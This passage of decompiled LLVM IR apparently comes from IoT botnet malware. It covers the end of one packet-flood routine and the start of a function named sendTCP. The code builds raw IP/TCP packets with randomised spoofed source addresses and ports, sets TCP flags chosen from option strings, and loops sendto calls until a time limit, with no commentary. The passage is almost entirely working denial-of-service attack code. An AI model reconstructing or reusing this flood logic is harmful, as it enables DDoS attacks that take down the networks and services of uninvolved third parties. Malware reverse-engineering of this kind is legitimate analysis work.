  %v3_f8d8 = add i32 %v3_f7c4, 26
  %v4_f8d8 = inttoptr i32 %v3_f8d8 to i8*
  store i8 0, i8* %v4_f8d8, align 2
  %v0_f8dc = load i32, i32* %r3.global-to-local, align 4
  %v1_f8dc = trunc i32 %v0_f8dc to i8
  %v2_f8dc = load i32, i32* %r2.global-to-local, align 4
  %v3_f8dc = add i32 %v2_f8dc, 7
  %v4_f8dc = inttoptr i32 %v3_f8dc to i8*
  store i8 %v1_f8dc, i8* %v4_f8dc, align 1
  %v1_f8e4 = add i32 %v3_f7c4, 28
  store i32 %v1_f8e4, i32* %r3.global-to-local, align 4
  %v3_f8ec = load i32, i32* %stack_var_0, align 4
  %v2_f8f0 = call i32 @makeRandomStr(i32 %v1_f8e4, i32 %v3_f8ec)
  %v1_f900 = or i32 %v3_f7c4, 2
  store i32 %v1_f900, i32* %r3.global-to-local, align 4
  %v1_f904 = inttoptr i32 %v1_f900 to i8*
  %v2_f904 = load i8, i8* %v1_f904, align 2
  %v3_f904 = zext i8 %v2_f904 to i32
  store i32 %v3_f904, i32* %r2.global-to-local, align 4
  %v1_f908 = or i32 %v1_f7c0, 3
  %v2_f908 = inttoptr i32 %v1_f908 to i8*
  %v3_f908 = load i8, i8* %v2_f908, align 1
  %v4_f908 = zext i8 %v3_f908 to i32
  %v4_f90c = mul nuw nsw i32 %v4_f908, 256
  %v5_f90c = or i32 %v4_f90c, %v3_f904
  store i32 %v5_f90c, i32* %r3.global-to-local, align 4
  %v3_f918 = call i32 @csum(i8* %v4_f820, i32 %v5_f90c)
  %sext6 = mul i32 %v3_f918, 16777216
  %v1_f91c = sdiv i32 %sext6, 16777216
  store i32 %v1_f91c, i32* %r3.global-to-local, align 4
  store i32 %v3_f7c4, i32* %r2.global-to-local, align 4
  %v1_f924 = trunc i32 %v1_f91c to i8
  %v3_f924 = add i32 %v3_f7c4, 10
  %v4_f924 = inttoptr i32 %v3_f924 to i8*
  store i8 %v1_f924, i8* %v4_f924, align 2
  %v0_f928 = load i32, i32* %r3.global-to-local, align 4
  %v3_f928 = sdiv i32 %v0_f928, 256
  store i32 %v3_f928, i32* %r3.global-to-local, align 4
  %v1_f92c = trunc i32 %v3_f928 to i8
  %v2_f92c = load i32, i32* %r2.global-to-local, align 4
  %v3_f92c = add i32 %v2_f92c, 11
  %v4_f92c = inttoptr i32 %v3_f92c to i8*
  store i8 %v1_f92c, i8* %v4_f92c, align 1
  %v2_f934 = call i32 @__GI_time(i32* null)
  %v2_f940 = add i32 %v2_f934, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_fa10 = add i32 %v3_f7c4, 4
  %v4_fa10 = inttoptr i32 %v3_fa10 to i8*
  %v2_fa38 = add i32 %v3_f7c4, 12
  %v3_fa38 = inttoptr i32 %v2_fa38 to i32*
  %v3_fad0 = mul i32 %arg8, 4
  %v3_fae0 = mul i32 %arg8, 1000
  br label %dec_label_pc_f95c.outer

dec_label_pc_f95c.outer:                          ; preds = %dec_label_pc_faf8, %dec_label_pc_fac8, %dec_label_pc_f8b8
  %stack_var_-104.0.ph = phi i32 [ 0, %dec_label_pc_f8b8 ], [ %v1_fab0, %dec_label_pc_fac8 ], [ %v1_fab0, %dec_label_pc_faf8 ]
  %stack_var_-100.0.ph = phi i32 [ 0, %dec_label_pc_f8b8 ], [ 0, %dec_label_pc_fac8 ], [ %v1_fafc, %dec_label_pc_faf8 ]
  br label %dec_label_pc_f95c

dec_label_pc_f95c:                                ; preds = %dec_label_pc_f95c.outer, %dec_label_pc_faa0
  %stack_var_-104.0 = phi i32 [ 0, %dec_label_pc_faa0 ], [ %stack_var_-104.0.ph, %dec_label_pc_f95c.outer ]
  store i32 %v3_f7c4, i32* %r2.global-to-local, align 4
  %v1_f964 = load i32, i32* @sp, align 4
  %v2_f964 = inttoptr i32 %v1_f964 to i32*
  store i32 %v2_f4b8, i32* %v2_f964, align 4
  %v1_f96c = load i32, i32* @sp, align 4
  %v2_f96c = add i32 %v1_f96c, 4
  %v3_f96c = inttoptr i32 %v2_f96c to i32*
  store i32 16, i32* %v3_f96c, align 4
  %v0_f974 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_f794, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_f980 = inttoptr i32 %v0_f974 to i32*
  %v7_f980 = call i32 @__libc_sendto(i32 %v0_f68c, i32* %v6_f980, i32 %v1_f794, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_f984 = call i32 @rand_cmwc()
  %v3_f990 = urem i32 %v0_f984, 65536
  store i32 %v3_f990, i32* %r3.global-to-local, align 4
  store i32 %v1_f7e4, i32* %r2.global-to-local, align 4
  %v1_f998 = trunc i32 %v0_f984 to i8
  store i8 %v1_f998, i8* %v5_f7e8, align 4
  %v0_f99c = load i32, i32* %r3.global-to-local, align 4
  %v3_f99c41 = udiv i32 %v0_f99c, 256
  %v1_f9a0 = trunc i32 %v3_f99c41 to i8
  %v2_f9a0 = load i32, i32* %r2.global-to-local, align 4
  %v3_f9a0 = add i32 %v2_f9a0, 1
  %v4_f9a0 = inttoptr i32 %v3_f9a0 to i8*
  store i8 %v1_f9a0, i8* %v4_f9a0, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_f44c, label %dec_label_pc_f9b0, label %dec_label_pc_f9c8

dec_label_pc_f9b0:                                ; preds = %dec_label_pc_f95c
  %v0_f9b0 = call i32 @rand_cmwc()
  %v3_f9b8 = mul i32 %v0_f9b0, 65536
  store i32 %v3_f9b8, i32* %r3.global-to-local, align 4
  %extract.t103 = trunc i32 %v0_f9b0 to i8
  br label %dec_label_pc_f9e4

dec_label_pc_f9c8:                                ; preds = %dec_label_pc_f95c
  store i32 %v3_f9d0.pre-phi, i32* %r3.global-to-local, align 4
  %v1_f9d8 = call i32 @htons(i32 %v3_f9d0.pre-phi)
  %extract.t104 = trunc i32 %v1_f9d8 to i8
  br label %dec_label_pc_f9e4

dec_label_pc_f9e4:                                ; preds = %dec_label_pc_f9b0, %dec_label_pc_f9c8
  %v0_f9b0.sink.off0 = phi i8 [ %extract.t103, %dec_label_pc_f9b0 ], [ %extract.t104, %dec_label_pc_f9c8 ]
  store i32 %v1_f7e4, i32* %r2.global-to-local, align 4
  %v4_f9e8 = sext i8 %v0_f9b0.sink.off0 to i32
  store i8 %v0_f9b0.sink.off0, i8* %v4_f8c0, align 2
  %v3_f9f4 = sdiv i32 %v4_f9e8, 256
  store i32 %v3_f9f4, i32* %r3.global-to-local, align 4
  %v1_f9f8 = trunc i32 %v3_f9f4 to i8
  %v2_f9f8 = load i32, i32* %r2.global-to-local, align 4
  %v3_f9f8 = add i32 %v2_f9f8, 3
  %v4_f9f8 = inttoptr i32 %v3_f9f8 to i8*
  store i8 %v1_f9f8, i8* %v4_f9f8, align 1
  %v0_f9fc = call i32 @rand_cmwc()
  %v3_fa08 = urem i32 %v0_f9fc, 65536
  store i32 %v3_fa08, i32* %r3.global-to-local, align 4
  store i32 %v3_f7c4, i32* %r2.global-to-local, align 4
  %v1_fa10 = trunc i32 %v0_f9fc to i8
  store i8 %v1_fa10, i8* %v4_fa10, align 4
  %v0_fa14 = load i32, i32* %r3.global-to-local, align 4
  %v3_fa14 = sdiv i32 %v0_fa14, 256
  store i32 %v3_fa14, i32* %r3.global-to-local, align 4
  %v1_fa18 = trunc i32 %v3_fa14 to i8
  %v2_fa18 = load i32, i32* %r2.global-to-local, align 4
  %v3_fa18 = add i32 %v2_fa18, 5
  %v4_fa18 = inttoptr i32 %v3_fa18 to i8*
  store i8 %v1_fa18, i8* %v4_fa18, align 1
  %v1_fa20 = call i32 @GetRandomIP(i32 %storemerge12)
  store i32 %v1_fa20, i32* %r3.global-to-local, align 4
  %v1_fa2c = call i32 @htonl(i32 %v1_fa20)
  store i32 %v1_fa2c, i32* %r2.global-to-local, align 4
  store i32 %v1_fa2c, i32* %v3_fa38, align 4
  store i32 %v1_f900, i32* %r3.global-to-local, align 4
  %v2_fa4c = load i8, i8* %v1_f904, align 2
  %v3_fa4c = zext i8 %v2_fa4c to i32
  store i32 %v3_fa4c, i32* %r2.global-to-local, align 4
  %v3_fa50 = load i8, i8* %v2_f908, align 1
  %v4_fa50 = zext i8 %v3_fa50 to i32
  %v4_fa54 = mul nuw nsw i32 %v4_fa50, 256
  %v5_fa54 = or i32 %v4_fa54, %v3_fa4c
  store i32 %v5_fa54, i32* %r3.global-to-local, align 4
  %v3_fa60 = call i32 @csum(i8* %v4_f820, i32 %v5_fa54)
  %sext7 = mul i32 %v3_fa60, 16777216
  %v1_fa64 = sdiv i32 %sext7, 16777216
  store i32 %v1_fa64, i32* %r3.global-to-local, align 4
  store i32 %v3_f7c4, i32* %r2.global-to-local, align 4
  %v1_fa6c = trunc i32 %v1_fa64 to i8
  store i8 %v1_fa6c, i8* %v4_f924, align 2
  %v0_fa70 = load i32, i32* %r3.global-to-local, align 4
  %v3_fa7045 = udiv i32 %v0_fa70, 256
  %v1_fa74 = trunc i32 %v3_fa7045 to i8
  %v2_fa74 = load i32, i32* %r2.global-to-local, align 4
  %v3_fa74 = add i32 %v2_fa74, 11
  %v4_fa74 = inttoptr i32 %v3_fa74 to i8*
  store i8 %v1_fa74, i8* %v4_fa74, align 1
  store i32 %stack_var_-104.0, i32* %r2.global-to-local, align 4
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v9_fa80 = icmp eq i32 %stack_var_-104.0, %arg6
  br i1 %v9_fa80, label %dec_label_pc_fa88, label %dec_label_pc_faac

dec_label_pc_fa88:                                ; preds = %dec_label_pc_f9e4
  %v2_fa8c = call i32 @__GI_time(i32* null)
  store i32 %v2_fa8c, i32* %r2.global-to-local, align 4
  store i32 %v2_f940, i32* %r3.global-to-local, align 4
  %v8_fa9c = icmp sgt i32 %v2_fa8c, %v2_f940
  br i1 %v8_fa9c, label %dec_label_pc_fb08, label %dec_label_pc_faa0

dec_label_pc_faa0:                                ; preds = %dec_label_pc_fa88
  br label %dec_label_pc_f95c

dec_label_pc_faac:                                ; preds = %dec_label_pc_f9e4
  %v1_fab0 = add i32 %stack_var_-104.0, 1
  store i32 %v1_fab0, i32* %r2.global-to-local, align 4
  store i32 %arg7, i32* %r3.global-to-local, align 4
  %v9_fac0 = icmp eq i32 %stack_var_-100.0.ph, %arg7
  br i1 %v9_fac0, label %dec_label_pc_fac8, label %dec_label_pc_faf8

dec_label_pc_fac8:                                ; preds = %dec_label_pc_faac
  store i32 %v3_fad0, i32* %r2.global-to-local, align 4
  store i32 %v3_fae0, i32* %r3.global-to-local, align 4
  %v1_fae8 = call i32 @usleep(i32 %v3_fae0)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f95c.outer

dec_label_pc_faf8:                                ; preds = %dec_label_pc_faac
  %v1_fafc = add i32 %stack_var_-100.0.ph, 1
  store i32 %v1_fafc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f95c.outer

dec_label_pc_fb08:                                ; preds = %dec_label_pc_fa88, %dec_label_pc_f6f0, %dec_label_pc_f6a4
  %v12_fb1033 = phi i32 [ %v3_f700, %dec_label_pc_f6f0 ], [ %v3_f6b4, %dec_label_pc_f6a4 ], [ %v2_fa8c, %dec_label_pc_fa88 ]
  br label %dec_label_pc_fb0c

dec_label_pc_fb0c:                                ; preds = %dec_label_pc_f5f8, %dec_label_pc_f498, %dec_label_pc_f520, %dec_label_pc_f508, %dec_label_pc_fb08
  %v12_fb10 = phi i32 [ %v3_f4a8, %dec_label_pc_f498 ], [ 0, %dec_label_pc_f520 ], [ %v3_f518, %dec_label_pc_f508 ], [ %v12_fb1033, %dec_label_pc_fb08 ], [ %v2_f5fc, %dec_label_pc_f5f8 ]
  store i32 %v3_f41c, i32* @r4, align 4
  store i32 %v6_f41c, i32* @fp, align 4
  ret i32 %v12_fb10

; uselistorder directives
  uselistorder i32 %v1_fafc, { 1, 0 }
  uselistorder i32 %v1_fab0, { 2, 1, 0 }
  uselistorder i32 %v1_fa64, { 1, 0 }
  uselistorder i32 %v3_fa14, { 1, 0 }
  uselistorder i32 %v0_f9fc, { 1, 0 }
  uselistorder i32 %v3_f9f4, { 1, 0 }
  uselistorder i8 %v0_f9b0.sink.off0, { 1, 0 }
  uselistorder i32 %v0_f9b0, { 1, 0 }
  uselistorder i32 %v0_f984, { 1, 0 }
  uselistorder i32 %stack_var_-104.0, { 0, 2, 1 }
  uselistorder i32 %v3_fae0, { 1, 0 }
  uselistorder i32 %v2_f940, { 1, 0 }
  uselistorder i32 %v3_f928, { 1, 0 }
  uselistorder i32 %v1_f91c, { 1, 0 }
  uselistorder i32 %v1_f900, { 0, 2, 1 }
  uselistorder i32 %v3_f9d0.pre-phi, { 1, 0 }
  uselistorder i8 %v0_f884.sink.off0, { 1, 0 }
  uselistorder i32 %v3_f8a4, { 2, 1, 0 }
  uselistorder i32 %v0_f884, { 1, 0 }
  uselistorder i32 %v0_f858, { 1, 0 }
  uselistorder i32 %v3_f850, { 1, 0 }
  uselistorder i32 %v1_f844, { 1, 0 }
  uselistorder i32 %v3_f838, { 1, 0 }
  uselistorder i32 %v3_f7c4, { 9, 7, 5, 8, 6, 3, 4, 14, 13, 12, 11, 10, 2, 1, 0 }
  uselistorder i32 %v1_f794, { 1, 0 }
  uselistorder i32 %v1_f74c, { 1, 0 }
  uselistorder i32 %v1_f620, { 1, 0 }
  uselistorder i32 %v3_f598, { 1, 0 }
  uselistorder i32 %stack_var_-108.0.ph, { 1, 2, 0 }
  uselistorder i32 %v3_f650, { 1, 0 }
  uselistorder i32 %v2_f57c, { 1, 0 }
  uselistorder i32 %v1_f52c, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v2_f4b8, { 1, 0, 2 }
  uselistorder i32 %v3_f47c, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-80, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 8, 9, 6, 7, 13, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 25, 26, 23, 24, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 38, 36, 39, 41, 40, 42, 43, 47, 44, 45, 46, 74, 48, 50, 49, 51, 52, 53, 55, 54, 56, 58, 57, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 70, 69, 71, 72, 73, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 0 }
  uselistorder i32 26, { 0, 2, 1 }
  uselistorder i32 (i32)* @usleep, { 1, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 1, 0 }
  uselistorder i32 %arg8, { 3, 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 3, 0, 2 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder i32 %arg4, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %arg2, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder label %dec_label_pc_fb0c, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_f9e4, { 1, 0 }
  uselistorder label %dec_label_pc_f95c, { 1, 0 }
  uselistorder label %dec_label_pc_f8b8, { 1, 0 }
  uselistorder label %dec_label_pc_f790, { 1, 0 }
  uselistorder label %dec_label_pc_f714, { 1, 0 }
  uselistorder label %dec_label_pc_f5f8, { 1, 0 }
  uselistorder label %dec_label_pc_f598, { 1, 0 }
  uselistorder label %dec_label_pc_f498, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_fb24 = load i32, i32* @r4, align 4
  %v6_fb24 = load i32, i32* @fp, align 4
  store i32 64300, i32* %stack_var_-4, align 4
  %v2_fb28 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_fb28, i32* @fp, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_fb64 = icmp eq i32 %arg2, 0
  br i1 %v2_fb64, label %dec_label_pc_fb6c, label %dec_label_pc_fb8c

dec_label_pc_fb6c:                                ; preds = %entry
  %v0_fb6c = call i32 @rand_cmwc()
  %v3_fb74 = mul i32 %v0_fb6c, 65536
  store i32 %v3_fb74, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fbb0

dec_label_pc_fb8c:                                ; preds = %entry
  %v3_fb94 = urem i32 %arg2, 65536
  store i32 %v3_fb94, i32* %r3.global-to-local, align 4
  %v1_fb9c = call i32 @htons(i32 %v3_fb94)
  br label %dec_label_pc_fbb0

dec_label_pc_fbb0:                                ; preds = %dec_label_pc_fb6c, %dec_label_pc_fb8c
  %v2_fbb4 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_fbb4, i32* %r3.global-to-local, align 4
  %v3_fbc0 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-60)
  store i32 %v3_fbc0, i32* %r3.global-to-local, align 4
  %v2_fbc8 = icmp eq i32 %v3_fbc0, 0
  br i1 %v2_fbc8, label %dec_label_pc_fbd4, label %dec_label_pc_101ac

dec_label_pc_fbd4:                                ; preds = %dec_label_pc_fbb0
  %v2_fbd4 = ptrtoint i32* %stack_var_-64 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 6, i32* @r2, align 4
  %v0_fbf8 = call i32 @socket()
  store i32 %v0_fbf8, i32* %r3.global-to-local, align 4
  %v2_fc08 = icmp eq i32 %v0_fbf8, 0
  br i1 %v2_fc08, label %dec_label_pc_fc10, label %dec_label_pc_fc28

dec_label_pc_fc10:                                ; preds = %dec_label_pc_fbd4
  %v2_fc14 = load i32, i32* @global_var_26864.54, align 4
  store i32 %v2_fc14, i32* %r3.global-to-local, align 4
  %v3_fc20 = call i32 @sockprintf(i32 %v2_fc14, i32 ptrtoint ([27 x i8]* @global_var_1c588.564 to i32))
  br label %dec_label_pc_101ac

dec_label_pc_fc28:                                ; preds = %dec_label_pc_fbd4
  store i32 1, i32* %stack_var_-68, align 4
  %v2_fc30 = ptrtoint i32* %stack_var_-68 to i32
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_fc30, i32* %r3.global-to-local, align 4
  %v6_fc4c = call i32 @__GI_setsockopt(i32 %v0_fbf8, i32 0, i32 3, i32* nonnull %stack_var_-68, i32 4)
  store i32 %v6_fc4c, i32* %r3.global-to-local, align 4
  %v1_fc54 = icmp slt i32 %v6_fc4c, 0
  br i1 %v1_fc54, label %dec_label_pc_fc5c, label %dec_label_pc_fc74

dec_label_pc_fc5c:                                ; preds = %dec_label_pc_fc28
  %v2_fc60 = load i32, i32* @global_var_26864.54, align 4
  store i32 %v2_fc60, i32* %r3.global-to-local, align 4
  %v3_fc6c = call i32 @sockprintf(i32 %v2_fc60, i32 ptrtoint ([33 x i8]* @global_var_1c5a4.566 to i32))
  br label %dec_label_pc_101ac

dec_label_pc_fc74:                                ; preds = %dec_label_pc_fc28
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v2_fc78 = icmp eq i32 %arg4, 0
  br i1 %v2_fc78, label %dec_label_pc_fca4, label %dec_label_pc_fc8c

dec_label_pc_fc8c:                                ; preds = %dec_label_pc_fc74
  %v1_fc90 = sub i32 32, %arg4
  store i32 %v1_fc90, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_fc9c = shl i32 -1, %v1_fc90
  br label %dec_label_pc_fca4

dec_label_pc_fca4:                                ; preds = %dec_label_pc_fc74, %dec_label_pc_fc8c
  %storemerge10 = phi i32 [ %v1_fc9c, %dec_label_pc_fc8c ], [ 0, %dec_label_pc_fc74 ]
  %v1_fca8 = add i32 %arg6, 40
  %v1_fcb8 = add i32 %arg6, 46
  %v3_fcbc = and i32 %v1_fcb8, -4
  %v1_fcc4 = load i32, i32* @sp, align 4
  %v2_fcc4 = sub i32 %v1_fcc4, %v3_fcbc
  %v1_fcd4 = add i32 %v2_fcc4, 11
  %v3_fcd8 = and i32 %v1_fcd4, -4
  store i32 %v3_fcd8, i32* %r2.global-to-local, align 4
  %v1_fcf8 = add i32 %v3_fcd8, 20
  store i32 %v1_fcf8, i32* %r3.global-to-local, align 4
  %v5_fcfc = inttoptr i32 %v1_fcf8 to i8*
  %v3_fd00 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fd00, i32* @r4, align 4
  %v1_fd08 = call i32 @GetRandomIP(i32 %storemerge10)
  store i32 %v1_fd08, i32* %r3.global-to-local, align 4
  %v1_fd14 = call i32 @htonl(i32 %v1_fd08)
  store i32 %v1_fd14, i32* %r2.global-to-local, align 4
  %v1_fd20 = add i32 %arg6, 20
  %v1_fd24 = load i32, i32* @sp, align 4
  %v2_fd24 = inttoptr i32 %v1_fd24 to i32*
  store i32 %v1_fd20, i32* %v2_fd24, align 4
  %v0_fd2c = load i32, i32* @r4, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v4_fd34 = inttoptr i32 %v3_fcd8 to i8*
  %v5_fd34 = call i32 @makeIPPacket(i8* %v4_fd34, i32 %v0_fd2c, i32 %v1_fd14, i32 6)
  %v0_fd38 = call i32 @rand_cmwc()
  %v3_fd44 = urem i32 %v0_fd38, 65536
  store i32 %v3_fd44, i32* %r3.global-to-local, align 4
  store i32 %v1_fcf8, i32* %r2.global-to-local, align 4
  %v1_fd4c = trunc i32 %v0_fd38 to i8
  store i8 %v1_fd4c, i8* %v5_fcfc, align 4
  %v0_fd50 = load i32, i32* %r3.global-to-local, align 4
  %v3_fd50 = sdiv i32 %v0_fd50, 256
  store i32 %v3_fd50, i32* %r3.global-to-local, align 4
  %v1_fd54 = trunc i32 %v3_fd50 to i8
  %v2_fd54 = load i32, i32* %r2.global-to-local, align 4
  %v3_fd54 = add i32 %v2_fd54, 1
  %v4_fd54 = inttoptr i32 %v3_fd54 to i8*
  store i8 %v1_fd54, i8* %v4_fd54, align 1
  %v0_fd58 = call i32 @rand_cmwc()
  %v2_fd64 = add i32 %v3_fcd8, 24
  %v3_fd64 = inttoptr i32 %v2_fd64 to i32*
  store i32 %v0_fd58, i32* %v3_fd64, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_fd70 = add i32 %v3_fcd8, 28
  %v3_fd70 = inttoptr i32 %v2_fd70 to i32*
  store i32 0, i32* %v3_fd70, align 4
  store i32 %v1_fcf8, i32* %r2.global-to-local, align 4
  %v1_fd78 = add i32 %v3_fcd8, 32
  %v2_fd78 = inttoptr i32 %v1_fd78 to i8*
  %v3_fd78 = load i8, i8* %v2_fd78, align 4
  %v1_fd84 = urem i8 %v3_fd78, 16
  %v1_fd88 = or i8 %v1_fd84, 80
  store i8 %v1_fd88, i8* %v2_fd78, align 4
  %v3_fd98 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_fd98, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1c5c8.571 to i32), i32* @r1, align 4
  %v3_fda4 = inttoptr i32 %v3_fd98 to i8*
  %v4_fda4 = call i32 @__GI_strcoll(i8* %v3_fda4, i32 ptrtoint ([4 x i8]* @global_var_1c5c8.571 to i32))
  store i32 %v4_fda4, i32* %r3.global-to-local, align 4
  %v2_fdac = icmp eq i32 %v4_fda4, 0
  br i1 %v2_fdac, label %dec_label_pc_fdb4, label %dec_label_pc_fe08

dec_label_pc_fdb4:                                ; preds = %dec_label_pc_fca4
  store i32 %v1_fcf8, i32* %r2.global-to-local, align 4
  %v1_fdb8 = add i32 %v3_fcd8, 33
  %v2_fdb8 = inttoptr i32 %v1_fdb8 to i8*
  %v3_fdb8 = load i8, i8* %v2_fdb8, align 1
  %v4_fdb8 = zext i8 %v3_fdb8 to i32
  %v1_fdbc = or i32 %v4_fdb8, 2
  store i32 %v1_fdbc, i32* %r3.global-to-local, align 4
  %v1_fdc0 = trunc i32 %v1_fdbc to i8
  store i8 %v1_fdc0, i8* %v2_fdb8, align 1
  store i32 %v1_fcf8, i32* %r2.global-to-local, align 4
  %v3_fdc8 = load i8, i8* %v2_fdb8, align 1
  %v4_fdc8 = zext i8 %v3_fdc8 to i32
  %v1_fdcc = or i32 %v4_fdc8, 4
  store i32 %v1_fdcc, i32* %r3.global-to-local, align 4
  %v1_fdd0 = trunc i32 %v1_fdcc to i8
  store i8 %v1_fdd0, i8* %v2_fdb8, align 1
  store i32 %v1_fcf8, i32* %r2.global-to-local, align 4
  %v3_fdd8 = load i8, i8* %v2_fdb8, align 1
  %v4_fdd8 = zext i8 %v3_fdd8 to i32
  %v1_fddc = or i32 %v4_fdd8, 1
  store i32 %v1_fddc, i32* %r3.global-to-local, align 4
  %v1_fde0 = trunc i32 %v1_fddc to i8
  store i8 %v1_fde0, i8* %v2_fdb8, align 1
  store i32 %v1_fcf8, i32* %r2.global-to-local, align 4
  %v3_fde8 = load i8, i8* %v2_fdb8, align 1
  %v4_fde8 = zext i8 %v3_fde8 to i32
  %v1_fdec = or i32 %v4_fde8, 16
  store i32 %v1_fdec, i32* %r3.global-to-local, align 4
  %v1_fdf0 = trunc i32 %v1_fdec to i8
  store i8 %v1_fdf0, i8* %v2_fdb8, align 1
  store i32 %v1_fcf8, i32* %r2.global-to-local, align 4
  %v3_fdf8 = load i8, i8* %v2_fdb8, align 1
  %v4_fdf8 = zext i8 %v3_fdf8 to i32
  %v1_fdfc = or i32 %v4_fdf8, 8
  store i32 %v1_fdfc, i32* %r3.global-to-local, align 4
  %v1_fe00 = trunc i32 %v1_fdfc to i8
  store i8 %v1_fe00, i8* %v2_fdb8, align 1
  br label %dec_label_pc_ff4c

dec_label_pc_fe08:                                ; preds = %dec_label_pc_fca4
  %v3_fe08 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_fe08, i32* %r3.global-to-local, align 4
  store i32 %v3_fe08, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c5cc.573 to i32), i32* @r1, align 4
  %v2_fe14 = call i32 @__GI_strtok(i32 %v3_fe08, i32 ptrtoint (i32* @global_var_1c5cc.573 to i32))
  store i32 %v2_fe14, i32* %r3.global-to-local, align 4
  %v2_ff4420 = icmp eq i32 %v2_fe14, 0
  br i1 %v2_ff4420, label %dec_label_pc_ff4c, label %dec_label_pc_fe24.lr.ph

dec_label_pc_fe24.lr.ph:                          ; preds = %dec_label_pc_fe08
  %v1_fe44 = add i32 %v3_fcd8, 33
  %v2_fe44 = inttoptr i32 %v1_fe44 to i8*
  br label %dec_label_pc_fe24

dec_label_pc_fe24:                                ; preds = %dec_label_pc_fe24.lr.ph, %dec_label_pc_ff2c
  %storemerge1421 = phi i32 [ %v2_fe14, %dec_label_pc_fe24.lr.ph ], [ %v2_ff34, %dec_label_pc_ff2c ]
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1c5d0.575 to i32), i32* @r1, align 4
  %v3_fe30 = inttoptr i32 %storemerge1421 to i8*
  %v4_fe30 = call i32 @__GI_strcoll(i8* %v3_fe30, i32 ptrtoint ([4 x i8]* @global_var_1c5d0.575 to i32))
  store i32 %v4_fe30, i32* %r3.global-to-local, align 4
  %v2_fe38 = icmp eq i32 %v4_fe30, 0
  br i1 %v2_fe38, label %dec_label_pc_fe40, label %dec_label_pc_fe54

dec_label_pc_fe40:                                ; preds = %dec_label_pc_fe24
  store i32 %v1_fcf8, i32* %r2.global-to-local, align 4
  %v3_fe44 = load i8, i8* %v2_fe44, align 1
  %v4_fe44 = zext i8 %v3_fe44 to i32
  %v1_fe48 = or i32 %v4_fe44, 2
  store i32 %v1_fe48, i32* %r3.global-to-local, align 4
  %v1_fe4c = trunc i32 %v1_fe48 to i8
  store i8 %v1_fe4c, i8* %v2_fe44, align 1
  br label %dec_label_pc_ff2c

dec_label_pc_fe54:                                ; preds = %dec_label_pc_fe24
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1c5d4.577 to i32), i32* @r1, align 4
  %v4_fe60 = call i32 @__GI_strcoll(i8* %v3_fe30, i32 ptrtoint ([4 x i8]* @global_var_1c5d4.577 to i32))
  store i32 %v4_fe60, i32* %r3.global-to-local, align 4
  %v2_fe68 = icmp eq i32 %v4_fe60, 0
  br i1 %v2_fe68, label %dec_label_pc_fe70, label %dec_label_pc_fe84

dec_label_pc_fe70:                                ; preds = %dec_label_pc_fe54
  store i32 %v1_fcf8, i32* %r2.global-to-local, align 4
  %v3_fe74 = load i8, i8* %v2_fe44, align 1
  %v4_fe74 = zext i8 %v3_fe74 to i32
  %v1_fe78 = or i32 %v4_fe74, 4
